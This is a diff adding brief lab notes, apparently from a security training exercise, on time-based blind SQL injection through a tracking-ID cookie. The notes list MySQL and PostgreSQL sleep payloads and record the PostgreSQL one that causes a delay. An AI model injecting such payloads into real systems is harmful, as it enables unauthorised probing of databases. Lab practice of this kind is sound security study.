@@ -1,0 +1,18 @@
+Blind SQL injection with time delays
+
+vulnerability in trackingid
+
+analysis:
+	 try different querries depending on the db type
+
+	 Mysql
+	 	' || (SELECT SLEEP(10))-- -> no delay
+	 postgres
+	 	' || (SELECT pg_sleep(10))-- -> no error causes delay
+
+
+payload
+-----------------------------
+' || (SELECT pg_sleep(10))--
+-----------------------------
+
